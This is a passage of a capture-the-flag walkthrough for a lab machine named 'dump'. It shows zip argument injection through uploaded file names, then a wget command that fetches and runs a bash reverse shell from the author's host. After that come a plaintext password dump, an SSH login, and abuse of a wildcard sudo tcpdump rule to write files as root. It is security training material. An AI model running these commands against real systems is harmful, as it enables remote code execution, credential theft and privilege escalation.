+Copyright (c) 1990-2008 Info-ZIP - Type 'zip "-L"' for software license.
+Zip 3.0 (July 5th 2008). Usage:
+zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]
+  The default action is to add or replace zipfile entries from list, which
+  can include the special name - to compress standard input.
+  If zipfile and list are omitted, zip compresses stdin to stdout.
+  -f   freshen: only changed files  -u   update: only changed or new files
+  -d   delete entries in zipfile    -m   move into zipfile (delete OS files)
+  -r   recurse into directories     -j   junk (don't record) directory names
+  -0   store only                   -l   convert LF to CR LF (-ll CR LF to LF)
+  -1   compress faster              -9   compress better
+  -q   quiet operation              -v   verbose operation/print version info
+  -c   add one-line comments        -z   add zipfile comment
+  -@   read names from stdin        -o   make zipfile as old as latest entry
+  -x   exclude the following names  -i   include only the following names
+  -F   fix zipfile (-FF try harder) -D   do not add directory entries
+  -A   adjust self-extracting exe   -J   junk zipfile prefix (unzipsfx)
+  -T   test zipfile integrity       -X   eXclude eXtra file attributes
+  -y   store symbolic links as the link instead of the referenced file
+  -e   encrypt                      -n   don't compress these suffixes
+  -h2  show more help
+  
+--&gt;</span>
+</code></pre></div></div>
+<p>That’s parameter injection!</p>
+<h4 id="show-command-line">Show Command Line</h4>
+<p>The <code class="language-plaintext highlighter-rouge">zip</code> help menu has a <code class="language-plaintext highlighter-rouge">-h2</code> option to “show more help”. In that output is a great option:</p>
+<blockquote>
+<p>-sc       show command line arguments as processed and exit</p>
+</blockquote>
+<p>I’ll delete the <code class="language-plaintext highlighter-rouge">--help</code> file. Then, in Burp Repeater, I’ll keep a window on the POST request to <code class="language-plaintext highlighter-rouge">/upload.php</code>, and upload a file named <code class="language-plaintext highlighter-rouge">-sc</code>. Then in another Repeater window, I’ll have the GET to <code class="language-plaintext highlighter-rouge">/download.php</code> so I can see the <code class="language-plaintext highlighter-rouge">zip</code> output:</p>
+<picture>
+<source srcset="/img/image-20251031224802488.webp" type="image/webp"/>
+<img alt="image-20251031224802488" class="include_image" loading="lazy" src="/img/image-20251031224802488.png"/>
+</picture>
+<h3 id="rce">RCE</h3>
+<h4 id="strategy">Strategy</h4>
+<p>The <a href="https://gtfobins.github.io/gtfobins/zip/">GTFObins page for zip</a> shows getting execution with <code class="language-plaintext highlighter-rouge">-T -TT '&lt;command&gt;'</code>:</p>
+<picture>
+<source srcset="/img/image-20251031224250483.webp" type="image/webp"/>
+<img alt="image-20251031224250483" class="include_image" loading="lazy" src="/img/image-20251031224250483.png"/>
+</picture>
+<p>Both <code class="language-plaintext highlighter-rouge">-T</code> and <code class="language-plaintext highlighter-rouge">-TT</code> fall in the same section of the help:</p>
+<blockquote>
+<p>Testing archives:                                                <br/>
+-T        test completed temp archive with unzip before updating archive
+-TT cmd   use command cmd instead of ‘unzip -tqq’ to test archive  <br/>
+        On Unix, to use unzip in current directory, could use: 
+          zip archive file1 file2 -T -TT “./unzip -tqq” <br/>
+        In cmd, {} replaced by temp archive path, else temp appended.
+        The return code is checked for success (0 on Unix)</p>
+</blockquote>
+<h4 id="run-command-failures">Run Command Failures</h4>
+<p>I’ll need to reset the box to get a clean filesystem. I’ll try uploading <code class="language-plaintext highlighter-rouge">-T</code>, <code class="language-plaintext highlighter-rouge">-TT</code>, and a command, but they end up in the wrong order:</p>
+<picture>
+<source srcset="/img/image-20251031225823077.webp" type="image/webp"/>
+<img alt="image-20251031225823077" class="include_image" loading="lazy" src="/img/image-20251031225823077.png"/>
+</picture>
+<p>If I try to download, I get:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">301</span> <span class="ne">Moved Permanently</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sat, 01 Nov 2025 02:57:48 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.65 (Debian)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">downloads/314f154e-dd17-4d48-8b7b-9e76eafc7717.zip</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">144</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+Preparing download...
+<span class="c">&lt;!--
+
+zip error: Invalid command arguments (option 'TT' (unzip command to use, name is added to end) requires a value)
+--&gt;</span>
+</code></pre></div></div>
+<p>It’s erroring out because it’s expecting something to follow <code class="language-plaintext highlighter-rouge">-TT</code> and there isn’t anything there.</p>
+<p>I’ll delete both <code class="language-plaintext highlighter-rouge">-T</code> and <code class="language-plaintext highlighter-rouge">-TT</code> and try adding a space before the <code class="language-plaintext highlighter-rouge">-</code> in each name on upload to see if I can shift the ordering. It looks good on the page:</p>
+<picture>
+<source srcset="/img/image-20251031230021500.webp" type="image/webp"/>
+<img alt="image-20251031230021500" class="include_image" loading="lazy" src="/img/image-20251031230021500.png"/>
+</picture>
+<p>But it fails to run at <code class="language-plaintext highlighter-rouge">zip</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Preparing download...
+&lt;!--
+  adding:  -T (stored 0%)
+  adding:  -TT (stored 0%)
+  adding: 'ping -c 1 10.10.14.17' (stored 0%)
+--&gt;
+</span></code></pre></div></div>
+<p>It isn’t treating <code class="language-plaintext highlighter-rouge">-T</code> or <code class="language-plaintext highlighter-rouge">-TT</code> as arguments.</p>
+<h4 id="run-command-success-local">Run Command Success Local</h4>
+<p>I’ll play around locally to get something that works. One long arg doesn’t work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip test.zip <span class="s1">'-T -TT wget 10.10.14.17/shell.sh'</span> test.pcap 
+<span class="go">
+zip error: Invalid command arguments (short option ' ' not supported)
+</span></code></pre></div></div>
+<p>When I break it in to two, it does seem to work:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip test.zip <span class="nt">-T</span> <span class="s1">'-TT wget 10.10.14.17/shell.sh'</span> test.pcap 
+<span class="go">updating: test.pcap (stored 0%)
+--2025-11-01 11:07:01--  http://10.10.14.17/shell.sh
+Connecting to 10.10.14.17:80... connected.
+HTTP request sent, awaiting response... 404 File not found
+2025-11-01 11:07:01 ERROR 404: File not found.
+
+--2025-11-01 11:07:01--  http://zihhmcau/
+Resolving zihhmcau (zihhmcau)... failed: Name or service not known.
+wget: unable to resolve host address ‘zihhmcau’
+test of test.zip FAILED
+
+zip error: Zip file invalid, could not spawn unzip, or wrong unzip (original files unmodified)
+free(): double free detected in tcache 2
+</span></code></pre></div></div>
+<p>It throws errors, but there’s a hit at my Python webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.10.14.17 - - [01/Nov/2025 11:07:01] code 404, message File not found
+10.10.14.17 - - [01/Nov/2025 11:07:01] "GET /shell.sh HTTP/1.1" 404 -
+</span></code></pre></div></div>
+<h4 id="run-command-success-remote">Run Command Success Remote</h4>
+<p>I can’t upload files with <code class="language-plaintext highlighter-rouge">/</code> in it. The server just takes after the last <code class="language-plaintext highlighter-rouge">/</code> and drops all before that. So I’ll use <code class="language-plaintext highlighter-rouge">wget</code> to get just an IP which will read <code class="language-plaintext highlighter-rouge">index.html</code>, and save it using <code class="language-plaintext highlighter-rouge">-O</code>. I’ll make a copy of a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a> named <code class="language-plaintext highlighter-rouge">index.html</code>.</p>
+<p>I’ll create three files:</p>
+<picture>
+<source srcset="/img/image-20251031232048529.webp" type="image/webp"/>
+<img alt="image-20251031232048529" class="include_image" loading="lazy" src="/img/image-20251031232048529.png"/>
+</picture>
+<p>The <code class="language-plaintext highlighter-rouge">-TT</code> arg will get <code class="language-plaintext highlighter-rouge">index.html</code>, save it as <code class="language-plaintext highlighter-rouge">s.sh</code>, and then run <code class="language-plaintext highlighter-rouge">bash s.sh</code>. The last <code class="language-plaintext highlighter-rouge">echo</code> is to clean up anything left in the command.</p>
+<p>When I click “Download Captures”, there’s a hit at my webserver:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">10.129.26.68 - - [01/Nov/2025 11:21:25] "GET / HTTP/1.1" 200 -
+</span></code></pre></div></div>
+<p>And then a shell at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.26.68 37874
+bash: cannot set terminal process group (548): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll upgrade my shell using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">            ‍</span>reset
+<span class="go">reset: unknown terminal type unknown
+</span><span class="gp">Terminal type? ‍</span>screen
+<span class="gp">www-data@dump:/var/cache/captures/23d982eb-1903-46ff-a45e-5566af0037a3$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-fritz">Shell as fritz</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="users">Users</h4>
+<p>There are two users with home directories in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">admin  fritz
+</span></code></pre></div></div>
+<p>That matches the users with shells set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000:Debian:/home/admin:/bin/bash
+fritz:x:1001:1001::/home/fritz:/bin/bash
+</span></code></pre></div></div>
+<p>www-data has some access to admin, but none to fritz:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/home$</span><span class="w"> </span>find <span class="nb">.</span>
+<span class="c">.
+</span><span class="go">./admin
+./admin/.ssh
+find: './admin/.ssh': Permission denied
+./admin/.bash_logout
+./admin/.profile
+./admin/.bashrc
+./admin/.bash_history
+./admin/.local
+./admin/.local/share
+find: './admin/.local/share': Permission denied
+./fritz
+find: './fritz': Permission denied
+</span></code></pre></div></div>
+<p>There’s nothing interesting here.</p>
+<h4 id="sudo">sudo</h4>
+<p>www-data has a pretty gnarly <code class="language-plaintext highlighter-rouge">sudo</code> privilege:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for www-data on dump:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on dump:
+    (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10
+        -w/var/cache/captures/*/[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
+        -F/var/cache/captures/filter.[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f]-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]
+</span></code></pre></div></div>
+<p>It makes sense that www-data would need to run <code class="language-plaintext highlighter-rouge">tcpdump</code> as root to collect packets from the website. This rule let’s www-data run <code class="language-plaintext highlighter-rouge">tcpdump</code> with the following options:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">-c 10</code> - Capture exactly 10 packets.</li>
+<li><code class="language-plaintext highlighter-rouge">-w ...</code> - Write the output to <code class="language-plaintext highlighter-rouge">/var/cache/captures/*/[UUID].pcap</code>. The <code class="language-plaintext highlighter-rouge">*</code> allows any subdirectory, and is vulnerable to path traversal (<code class="language-plaintext highlighter-rouge">*</code> will match on <code class="language-plaintext highlighter-rouge">../../../</code>). In fact, it will even</li>
+<li><code class="language-plaintext highlighter-rouge">-F ...</code> - Read a filter from <code class="language-plaintext highlighter-rouge">/var/cache/captures/filter.[UUID]</code>.</li>
+</ul>
+<p>I’ll return to this for root. I can skip getting user for some paths from here to root.</p>
+<h4 id="website">Website</h4>
+<p>In <code class="language-plaintext highlighter-rouge">/var/www</code> there are three directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">database  html  userdata
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">userdata</code> is empty. <code class="language-plaintext highlighter-rouge">html</code> has the web files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span><span class="nb">ls </span>html/    
+<span class="go">capture.php    delete.php    downloads  logout.php  upload.php
+capturing.php  download.php  index.php  style.css   view.php
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">capture.php</code> loads an <code class="language-plaintext highlighter-rouge">iframe</code> of <code class="language-plaintext highlighter-rouge">capturing.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s1">'.functions.php'</span><span class="p">;</span>
+<span class="nb">session_start</span><span class="p">();</span> 
+<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="cp">&lt;?=</span><span class="nf">template_header</span><span class="p">(</span><span class="s1">'hdmpll?'</span><span class="p">)</span><span class="cp">?&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content home"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;h2&gt;</span>Dumping a maximum of 10 packets for port <span class="cp">&lt;?=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'capport'</span><span class="p">]</span><span class="cp">?&gt;</span> for 10s...<span class="nt">&lt;/h2&gt;</span>
+<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"capturing.php"</span> <span class="na">height=</span><span class="s">"300"</span> <span class="na">width=</span><span class="s">"1000"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="cp">&lt;?=</span><span class="nf">template_footer</span><span class="p">()</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">capturing.php</code> has the <code class="language-plaintext highlighter-rouge">sudo tcpdump</code> call:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span> <span class="s1">'.functions.php'</span><span class="p">;</span>
+<span class="nb">session_start</span><span class="p">();</span> 
+<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: index.php'</span><span class="p">);</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content home"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;pre&gt;&lt;div</span> <span class="na">class=</span><span class="s">'code'</span><span class="nt">&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="nb">ob_end_flush</span><span class="p">();</span>
+    <span class="nv">$cap</span> <span class="o">=</span> <span class="nf">guidv4</span><span class="p">();</span>
+    <span class="nv">$filter</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'capdir'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'filter.'</span> <span class="mf">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">],</span><span class="s2">"w"</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s2">"port "</span> <span class="mf">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'capport'</span><span class="p">]);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$filter</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s2">"sudo tcpdump -c10 -w"</span> <span class="mf">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userdir'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">"/</span><span class="nv">$cap</span><span class="s2"> -F"</span> <span class="mf">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'capdir'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'filter.'</span> <span class="mf">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="mf">.</span> <span class="s2">" 2&gt;&amp;1"</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+You can view the capture <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/view.php?fn=</span><span class="cp">&lt;?=</span><span class="nv">$cap</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="na">target=</span><span class="s">"_top"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">database</code> has a SQLite file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span><span class="nb">ls </span>database/
+<span class="go">database.sqlite3
+</span><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span>file database/database.sqlite3 
+<span class="go">database/database.sqlite3: SQLite 3.x database, last written using SQLite version 3034001
+</span></code></pre></div></div>
+<h4 id="database">Database</h4>
+<p>The database only has one table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span>sqlite3 database/database.sqlite3 
+<span class="go">SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+users
+</span></code></pre></div></div>
+<p>It has plaintext passwords for users, both the account I created and the fritz user:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="p">.</span><span class="n">headers</span> <span class="k">on</span>
+<span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="go">username|password|guid
+fritz|Passw0rdH4shingIsforNoobZ!|534ce8b9-6a77-4113-a8c1-66462519bfd1
+0xdf|0xdf|23d982eb-1903-46ff-a45e-5566af0037a3
+</span></code></pre></div></div>
+<h3 id="su--ssh">su / SSH</h3>
+<p>That password works for the fritz user with <code class="language-plaintext highlighter-rouge">su</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/www$</span><span class="w"> </span>su - fritz
+<span class="go">Password: 
+</span><span class="gp">fritz@dump:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>It also works from my host using SSH:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'Passw0rdH4shingIsforNoobZ!'</span> ssh fritz@10.129.26.68
+<span class="go">Linux dump 5.10.0-36-cloud-amd64 #1 SMP Debian 5.10.244-1 (2025-09-29) x86_64
+</span><span class="gp">fritz@dump:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">ea37a470************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>The fritz user can’t run <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+</span><span class="c">    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+</span><span class="go">
+[sudo] password for fritz: 
+Sorry, user fritz may not run sudo on dump.
+</span></code></pre></div></div>
+<p>Other than the user flag, it’s very empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">fritz@dump:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 24
+drwx------ 2 fritz fritz 4096 Nov  1 19:44 .
+drwxr-xr-x 4 root  root  4096 Mar  5  2023 ..
+lrwxrwxrwx 1 root  root     9 Oct 21 20:38 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 fritz fritz  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 fritz fritz 3526 Mar 27  2022 .bashrc
+-rw-r--r-- 1 fritz fritz  807 Mar 27  2022 .profile
+-rw-r----- 1 root  fritz   33 Nov  1 03:18 user.txt
+</span></code></pre></div></div>
+<h3 id="sudo-abuse-primitives">Sudo Abuse Primitives</h3>
+<h4 id="initial-directory-traversal">Initial Directory Traversal</h4>
+<p>I’ll make an empty filter and try to write to file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">touch</span> /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/../../../../dev/shm/11111111-1111-1111-1111-111111111111 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa   
+<span class="go">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+12 packets received by filter
+0 packets dropped by kernel
+</span></code></pre></div></div>
+<p>This writes a file that’s owned by tcpdump:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/11111111-1111-1111-1111-111111111111 
+<span class="go">-rw-r--r-- 1 tcpdump tcpdump 943 Nov  1 19:48 /dev/shm/11111111-1111-1111-1111-111111111111
+</span></code></pre></div></div>
+<h4 id="parameter-injection-1">Parameter Injection</h4>
+<p>The previous attack also works if I split the <code class="language-plaintext highlighter-rouge">-w</code> command to add a second. The second <code class="language-plaintext highlighter-rouge">-w</code> is where it will write, and this allows me to abuse the <code class="language-plaintext highlighter-rouge">*</code> a lot more!</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-w</span> /dev/shm/11111111-1111-1111-1111-111111111112 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa                
+<span class="go">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+14 packets received by filter
+0 packets dropped by kernel
+</span><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/11111111-1111-1111-1111-111111111112 
+<span class="go">-rw-r--r-- 1 tcpdump tcpdump 963 Nov  1 19:54 /dev/shm/11111111-1111-1111-1111-111111111112
+</span></code></pre></div></div>
+<p>Now I can add any other <code class="language-plaintext highlighter-rouge">tcpdump</code> parameters into the command as long as it matches the regex.</p>
+<h4 id="write-as-other-user">Write as Other User</h4>
+<p>The <code class="language-plaintext highlighter-rouge">-Z [user]</code> flag will write files as another user. So I can write as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> root <span class="nt">-w</span> /dev/shm/11111111-1111-1111-1111-111111111113 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="go">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+11 packets received by filter
+0 packets dropped by kernel
+</span><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/11111111-1111-1111-1111-111111111113
+<span class="go">-rw-r--r-- 1 root root 913 Nov  2 00:38 /dev/shm/11111111-1111-1111-1111-111111111113
+</span></code></pre></div></div>
+<p>I can write as fritz as well:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> frtiz <span class="nt">-w</span> /dev/shm/11111111-1111-1111-1111-111111111114 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+<span class="go">tcpdump: Couldn't find user 'frtiz'
+</span><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-c10</span> <span class="nt">-w</span>/var/cache/captures/a/ <span class="nt">-Z</span> fritz <span class="nt">-w</span> /dev/shm/11111111-1111-1111-1111-111111111114 <span class="nt">-F</span>/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa 
+<span class="go">tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+10 packets captured
+21 packets received by filter
+0 packets dropped by kernel
+</span><span class="gp">www-data@dump:/var/cache/captures$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/shm/11111111-1111-1111-1111-111111111114
+<span class="go">-rw-r--r-- 1 fritz fritz 945 Nov  2 00:41 /dev/shm/11111111-1111-1111-1111-111111111114
+</span></code></pre></div></div>
+<h4 id="write-specific-lines">Write Specific Lines</h4>
+<p>I’ll generate a PCAP on my host that will reflect lines in a <code class="language-plaintext highlighter-rouge">sudoers</code> file. I’ll start by making a file, <code class="language-plaintext highlighter-rouge">sudoers</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
